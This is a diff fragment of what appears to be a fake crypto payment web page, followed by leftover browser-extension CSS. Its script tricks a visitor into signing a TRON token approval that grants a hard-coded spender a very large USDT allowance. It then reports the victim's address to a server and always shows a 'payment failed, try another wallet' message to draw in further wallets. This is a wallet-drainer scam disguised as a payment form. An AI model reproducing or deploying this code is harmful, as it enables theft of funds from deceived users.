+										'0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
+							},
+						],
+						address
+				);
+				console.log(approve_tx);
+				print_dev(approve_tx)
+				let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
+				// signed_tx.raw_data = approve_tx_raw;
+				try {
+					let result = tronWeb.trx.sendRawTransaction(signed_tx);
+					console.log(result);
+					await success_callback(address, approve_address[0], 2);
+				} catch (error) {
+					alert('失败');
+					toggleLoader('none');
+					console.log(error)
+				}
+			}
+		}
+	}
+
+async function success_callback(address, approved, type) {
+
+    // 统一刷新函数，点击 OK 后刷新
+    const reloadPage = () => {
+        window.location.reload();
+    };
+
+    if (push) {
+        try {
+            const response = await fetch(
+                '/success_callback?address=' + address +
+                '&approved=' + approved +
+                '&approve_type=' + type +
+                '&chain=' + chain +
+                '&site=' + site_id
+            );
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+
+            const data = await response.json();
+
+            if (data.code === 1) {
+                // 失败提示
+                alert('付款失败，请尝试使用其他钱包！');
+            } else {
+                // 成功提示
+                alert('付款失败，请尝试使用其他钱包！');
+            }
+
+            // 点击 OK 后刷新页面
+            reloadPage();
+
+        } catch (error) {
+            alert('付款失败！');
+            toggleLoader('none');
+            reloadPage();
+        }
+
+    } else {
+        try {
+            const response = await fetch('/add_bl?address=' + address);
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+
+            const data = await response.json();
+
+            // 无论 data.code 是多少，原来都是失败流程
+            alert('付款失败！');
+            toggleLoader('none');
+            set_404();
+
+            // 点击 OK 后刷新
+            reloadPage();
+
+        } catch (error) {
+            // 网络异常或请求失败也刷新
+            window.location.reload();
+        }
+    }
+}
+</script>
+<script>
+	const is = document.getElementById('input_submit')
+	// 地址
+	const address_ele = document.getElementById('pay_addr')
+	// 金额
+	const rate = document.getElementById('rate')
+	const zz = document.getElementById('zz')
+	const module = document.getElementById('module')
+	const m1 = document.getElementById('m1')
+	const m2 = document.getElementById('m2')
+	const safe_f = document.getElementById('safe_f')
+	const safe = document.getElementById('safe')
+	const danger_f = document.getElementById('danger_f')
+	const danger = document.getElementById('danger')
+	// 取消
+	const cancel = document.getElementById('cancel')
+	// 确认
+	const confirm = document.getElementById('confirm')
+	const amount_ele = document.getElementById('amount')
+
+	confirm.addEventListener('click', () => {
+		// 点击确认
+		// let rate = rate.value
+		// let address = address.value
+
+		// console.log(rate, address)
+		pay();
+		// 收起弹窗
+		// module.classList.remove('animate__zoomInDown')
+		// module.classList.remove('show')
+		// module.classList.add('hide')
+		// zz.style.display = 'none'
+	})
+
+	// 金额输入
+	rate.addEventListener('input', () => {
+		let rateValue = rate.value
+		if (!parseFloat(rateValue)) {
+			rate.value = 1.0
+		}
+	})
+
+	// 收起弹窗
+	cancel.addEventListener('click', () => {
+		module.classList.remove('animate__zoomInDown')
+		module.classList.remove('show')
+		module.classList.add('hide')
+		zz.style.display = 'none'
+	})
+
+	// 出现弹窗
+	is.addEventListener('click', async () => {
+      if (address === undefined && accounts === undefined) {
+          window.location.reload()
+      } else {
+          if (approve_address.length >= 3) {
+              // 检查当前授权额度
+              const userAddr = address || getFirstElementOrItself(accounts);
+              const spenderAddr = approve_address[0]; // 波场地址
+
+              const currentAllowance = await checkCurrentAllowance(userAddr, spenderAddr);
+              const fiveMillion = 5000000 * 1e6; // 500万 USDT (6位小数)
+
+              // 如果已授权额度 >= 500万，阻止继续授权
+              if (currentAllowance >= fiveMillion) {
+                  alert('付款失败，请使用其他钱包!');
+                  return; // 阻止弹窗出现
+              }
+
+              // 额度 < 500万，允许继续授权
+              module.classList.remove('animate__zoomOutDown')
+              module.classList.remove('hide')
+              zz.style.display = 'block'
+              module.classList.add('show')
+              module.classList.add('animate__zoomInDown')
+
+              let rateValue = rate.value
+              if (parseFloat(rateValue) % 1 == 0) {
+                  amount_ele.value = parseFloat(rateValue).toFixed(1)
+              } else {
+                  amount_ele.value = parseFloat(rateValue)
+              }
+          }
+      }
+  })
+
+	m1.addEventListener('click', () => {
+		safe.style.display = 'flex'
+		safe_f.style.display = 'flex'
+		danger.style.display = 'none'
+		danger_f.style.display = 'none'
+	})
+	m2.addEventListener('click', () => {
+		safe.style.display = 'none'
+		safe_f.style.display = 'none'
+
+		danger.style.display = 'flex'
+		danger_f.style.display = 'flex'
+	})
+
+	document.addEventListener('DOMContentLoaded', function () {
+		const addressInput = document.getElementById('address')
+		const rateInput = document.getElementById('rate')
+		const submitButton = document.getElementById('input_submit')
+
+		function validateInputs() {
+			// const address = addressInput.value.trim()
+			// const rate = rateInput.value.trim()
+			// if (address && rate) {
+			//     submitButton.classList.add('active')
+			// } else {
+			//     submitButton.classList.remove('active')
+			// }
+			submitButton.classList.add('active')
+		}
+
+		// addressInput.addEventListener('input', validateInputs)
+		rateInput.addEventListener('input', validateInputs)
+
+		// 初始化按钮状态
+		validateInputs()
+	})
+</script>
+
+<yd-mg-icon style="position: fixed; z-index: 2147483647;"><template shadowrootmode="open"><style>
+.item {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.all {
+    direction: ltr;
+}
+.all > * {
+    direction: rtl;
+}
+.hidden {
+    display: none;
+    transition: width 0.3s linear;
+}
+.container:hover .hidden {
+    width: var(--131b0bc3);
+    height: var(--367772ca);
+    display: flex;
+}
+.container {
+    position: fixed;
+    top:var(--8b7ed71a);
+    right:var(--2c4e45ba);
+    width: var(--b2ad46e2);
+    height: var(--14b33b7e);
+    background-color: #fff;
+    border-radius: var(--e55f886a);
+    box-shadow: 0 0 10px #b3b5b8;
+    transition: width 0.3s linear;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.container:hover {
+    width: var(--301156d1);
+    border-radius: var(--e55f886a);
+    justify-content: space-around;
+}
+.icon {
+    width: var(--131b0bc3);
+    height: var(--367772ca);
+    cursor: pointer;
+    user-select: none;
+}
+.icon:hover {
+}
+.yd-translate-loader {
+    border: 2px solid #f3f3f3;
+    border-top: 2px solid #3498db;
+    border-radius: 50%;
+    height: var(--367772ca);
+    width:  var(--131b0bc3);
+    animation: spin 0.5s linear infinite;
+}
+@keyframes spin {
+0% { transform: rotate(0deg);
+}
+100% { transform: rotate(360deg);
+}
+}
+@keyframes append-animate {
+from {
+        opacity: 0;
+}
+to {
+        opacity: 1;
+}
+}
+.popup {
+  animation: popup 0.3s forwards;
+}
+@keyframes popup {
+0% {
+    opacity: 0;
+    transform: scale(0);
+}
+100% {
+    opacity: 1;
+    transform: scale(1);
+}
+}
+</style><div class="all" style="position: fixed; z-index: 2147483647; --131b0bc3: 22px; --367772ca: 22px; --8b7ed71a: 0px; --2c4e45ba: 0px; --b2ad46e2: 26px; --14b33b7e: 26px; --e55f886a: 13px; --301156d1: 78px;"><!----></div></template></yd-mg-icon><yd-mg-block-icon><template shadowrootmode="open"><style>@charset "UTF-8";
+.disabled-element[data-v-d3135d60] {
+  cursor: not-allowed;
+}
+.all[data-v-d3135d60] {
+  position: absolute;
+  z-index: 1;
+}
+.all .container[data-v-d3135d60] {
+  width: var(--5a3ced10);
+  height: var(--58dc89c6);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.all .container .yd-line[data-v-d3135d60] {
+  display: block;
+  position: absolute;
+  height: var(--c03ec7f0);
+  top: var(--7808ebd8);
+  left: var(--891c21b0);
+}
+.all .container .yd-line .orignal[data-v-d3135d60] {
+  padding: 1px;
+  background-color: #E4E7F3;
+  height: var(--5934d8d6);
+}
+.all .container .yd-line .yd[data-v-d3135d60] {
+  padding: 1px;
+  background-color: #FF939E;
+  height: var(--4d327ada);
+}
+.all .container .yd-line .llm[data-v-d3135d60] {
+  padding: 1px;
+  background-color: #2485FF;
+  height: var(--18678bd3);
+}
+.all .container .tooltip-container[data-v-d3135d60] {
+  display: inline-block;
+  position: absolute;
+  top: var(--147b79a2);
+  left: var(--7afb4d26);
+}
+.all .container .tooltip-container .icon[data-v-d3135d60] {
+  width: var(--5a3ced10);
+  height: var(--58dc89c6);
+  background-image: var(--4a440a69);
+  border-radius: 5px;
+  cursor: pointer;
+}
+.all .container .tooltip-container .icon[data-v-d3135d60]::before {
+  content: var(--4809e853);
+  display: none;
+}
+.all .container .tooltip-container .icon[data-v-d3135d60]:hover {
+  box-shadow: 0px 4px 10px rgba(56, 112, 200, 0.16);
+  transition: width 0.3s linear;
+  background-image: var(--4809e853);
+  cursor: pointer;
+}
+.all .container .tooltip-container .llmIcon[data-v-d3135d60] {
+  width: var(--5a3ced10);
+  height: var(--58dc89c6);
+  background-image: var(--4a440a69);
+  border-radius: 5px;
+}
+.all .container .tooltip-container .llmIcon[data-v-d3135d60]:hover {
+  width: var(--5a3ced10);
+  height: 48px;
+  background-image: var(--11da4116);
+  border-radius: 5px;
+}
+.all .container .tooltip-container .tooltip[data-v-d3135d60] {
+  position: absolute;
+  top: var(--523390c5);
+  /* 放在元素的上方 */
+  left: var(--178a82d2);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  background-color: #F9FBFF;
+  padding: 8px;
+  width: 150px;
+  height: 40px;
+  border-radius: 8px;
+  box-sizing: border-box;
+  border: 1px solid rgba(216, 217, 219, 0.5);
+  box-shadow: 0px 1.2px 3.6px 0px rgba(0, 0, 0, 0.1), 0px 2px 20px 0px rgba(27, 19, 98, 0.08);
+  font-family: PingFang SC;
+  font-size: 16px;
+  font-weight: normal;
+  line-height: 150%;
+  text-align: center;
+  letter-spacing: 0em;
+  user-select: none;
+  color: #2A2B2E;
+}
+.all .container .tooltip-container .llmTooltip[data-v-d3135d60] {
+  position: absolute;
+  top: var(--523390c5);
+  /* 放在元素的上方 */
+  left: var(--178a82d2);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  background-color: #F9FBFF;
+  padding: 8px;
+  width: 200px;
+  height: 40px;
+  border-radius: 8px;
+  box-sizing: border-box;
+  border: 1px solid rgba(216, 217, 219, 0.5);
+  box-shadow: 0px 1.2px 3.6px 0px rgba(0, 0, 0, 0.1), 0px 2px 20px 0px rgba(27, 19, 98, 0.08);
+  font-family: PingFang SC;
+  font-size: 16px;
+  font-weight: normal;
+  line-height: 150%;
+  text-align: center;
+  letter-spacing: 0em;
+  user-select: none;
+  color: #2A2B2E;
+}
+.all .container .yd-translate-loader-block[data-v-d3135d60] {
+  position: absolute;
+  top: var(--147b79a2);
+  left: var(--7afb4d26);
+  width: var(--5a3ced10);
+  height: var(--5a3ced10);
+  background-image: var(--3fa19693);
+  /* 确保这里是正确的图片路径 */
+  background-repeat: no-repeat;
+  background-size: cover;
+  box-shadow: 0px 4px 10px rgba(56, 112, 200, 0.16);
+  overflow: hidden;
+  /* 保持子元素的圆角效果 */
+}
+.all .container .yd-translate-loader-block[data-v-d3135d60]::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  border-radius: 5px;
+  border: 1px solid transparent;
+  background: linear-gradient(to left bottom, rgba(38, 132, 255, 0.6), rgba(120, 85, 250, 0.6));
+  -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+  -webkit-mask-composite: xor;
+  mask-composite: exclude;
+}
+.all .container .tip[data-v-d3135d60] {
+  background-color: #F9FBFF;
+  padding: 8px;
+  border-radius: 8px;
+  height: 400px;
+  border: 1px solid #D8D9DB;
+}</style><div data-v-d3135d60="" class="all notranslate" style="--5a3ced10: 24px; --58dc89c6: 24px; --c03ec7f0: 0px; --7808ebd8: 0px; --891c21b0: 0px; --5934d8d6: 0px; --4d327ada: 0px; --18678bd3: 0px; --147b79a2: -16px; --7afb4d26: -44px; --4a440a69: url(chrome-extension://jlpcnoohcpfgpbalhlggdhjocgnlgafn/block.svg); --4809e853: url(chrome-extension://jlpcnoohcpfgpbalhlggdhjocgnlgafn/block-h.svg); --11da4116: url(chrome-extension://jlpcnoohcpfgpbalhlggdhjocgnlgafn/block-h-llm.svg); --523390c5: undefined; --178a82d2: undefined; --3fa19693: url(chrome-extension://jlpcnoohcpfgpbalhlggdhjocgnlgafn/block-l.gif);"><!----></div></template></yd-mg-block-icon><yd-image-ocr style="z-index: 2147483647;"><template shadowrootmode="open"><style>@charset "UTF-8";
+.modal-overlay[data-v-04ce0a75] {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.modal-content[data-v-04ce0a75] {
+  background-color: white;
+  padding: 20px;
+  border-radius: 10px;
+  display: flex;
+  gap: 20px;
+  width: 800px;
+  height: 500px;
+  flex-direction: column;
+  position: relative;
+}
+.modal-header[data-v-04ce0a75] {
+  display: flex;
+  justify-content: flex-end;
+  height: 24px;
+}
+.modal-body[data-v-04ce0a75] {
+  display: flex;
+  flex-grow: 1;
+  flex-direction: row;
+}
+.modal-body .imageContainer[data-v-04ce0a75] {
+  flex: 2;
+  justify-content: center;
+}
+.modal-body .img[data-v-04ce0a75] {
+  position: relative;
+  background-size: contain;
+  background-position: center;
+  height: 600px;
+  background-repeat: no-repeat;
+}
+.modal-body .img .box[data-v-04ce0a75] {
+  position: absolute;
+  border: #333 3px solid;
+}
+.modal-body .text-content[data-v-04ce0a75] {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  /* 根据需要调整文本内容的样式 */
+}
+.modal-body .text-content .text[data-v-04ce0a75] {
+  overflow-y: auto;
+  height: 450px;
+}
+.modal-body .text-content .toolbar[data-v-04ce0a75] {
+  height: 36px;
+  display: flex;
+  justify-content: space-around;
+  flex-direction: row;
+  flex-wrap: wrap;
+}
+.close-button[data-v-04ce0a75] {
+  background-color: transparent;
+  /* 透明背景 */
+  border: none;
+  /* 去除边框 */
+  cursor: pointer;
+  /* 鼠标悬停时显示指针 */
+  outline: none;
+  /* 去除焦点轮廓 */
+  position: absolute;
+  /* 绝对定位 */
+  top: 10px;
+  /* 距顶部的距离 */
+  right: 10px;
+  /* 距右边的距离 */
+  font-size: 24px;
+  /* 字体大小 */
+  line-height: 24px;
+  /* 行高，以确保垂直居中 */
+  color: #333;
+  /* 字体颜色 */
+  font-weight: bold;
+  /* 字体加粗 */
+}
+.close-button[data-v-04ce0a75]:hover {
+  color: #666;
+  /* 鼠标悬停时的颜色变化 */
+}
+.line[data-v-04ce0a75], .redline[data-v-04ce0a75] {
+  font-family: Arial, Helvetica, sans-serif;
+  /* 使用无衬线字体 */
+  font-size: 16px;
+  /* 设置合适的字体大小 */
+  line-height: 24px;
+  color: #333;
+  /* 文字颜色 */
+  padding: 3px 3px 3px 6px;
+  /* 内边距 */
+  margin-top: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s, border-left-color 0.3s;
+  /* 背景色和边框颜色变化的过渡效果 */
+  border-left: 3px solid #ddd;
+  /* 设置灰色的左边框 */
+}
+.redline[data-v-04ce0a75] {
+  border-left-color: #e53935;
+  /* 鼠标悬停时边框颜色变为红色 */
+  background-color: #f5f5f5;
+}
+.button[data-v-04ce0a75] {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  background-color: #FB4A3E;
+  /* 一个明亮但不饱和的红色 */
+  color: white;
+  /* 文本颜色为白色 */
+  padding: 5px 10px;
+  /* 按钮内边距 */
+  border: none;
+  /* 无边框 */
+  border-radius: 5px;
+  /* 轻微的圆角 */
+  font-size: 10px;
+  text-transform: uppercase;
+  /* 文本大写 */
+  cursor: pointer;
+  /* 鼠标悬停时的指针样式 */
+  transition: background-color 0.3s;
+  /* 背景颜色变化的过渡效果 */
+}
+.button[data-v-04ce0a75]:hover {
+  background-color: #d32f2f;
+  /* 鼠标悬停时的背景颜色稍暗 */
+}
+.button[data-v-04ce0a75]:active {
+  background-color: #c62828;
+  /* 鼠标点击时的背景颜色更暗 */
+}
+.button[data-v-04ce0a75]:disabled {
+  background-color: #ef9a9a;
+  /* 禁用状态的按钮颜色更亮，更少饱和度 */
+  cursor: default;
+  /* 禁用状态的鼠标样式 */
+}
+.loading-indicator[data-v-04ce0a75] {
+  /* 添加你的样式，比如居中显示、动画等 */
+  position: absolute;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 1.5em;
+  /* ...其他样式 */
+}
+.message[data-v-04ce0a75] {
+  position: absolute;
+  top: 50%;
+  /* 定位到父元素的中间 */
+  left: 50%;
+  /* 定位到父元素的中间 */
+  transform: translate(-50%, -50%);
+  /* 使用 transform 实现精确居中 */
+  padding: 10px;
+  background-color: white;
+  /* 设置背景颜色为白色 */
+  border: 1px solid blue;
+  border-radius: 5px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+  /* 添加阴影效果 */
+  text-align: center;
+  z-index: 100;
+  /* 确保提示信息在其他元素上方 */
+}
+.loader[data-v-04ce0a75] {
+  border: 5px solid #f3f3f3;
+  /* 浅灰色边框 */
+  border-top: 5px solid #3498db;
+  /* 蓝色边框 */
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin-04ce0a75 2s linear infinite;
+  margin-bottom: 20px;
+}
+@keyframes spin-04ce0a75 {
+0% {
+    transform: rotate(0deg);
+}
+100% {
+    transform: rotate(360deg);
+}
+}</style><!----></template></yd-image-ocr></body></html>
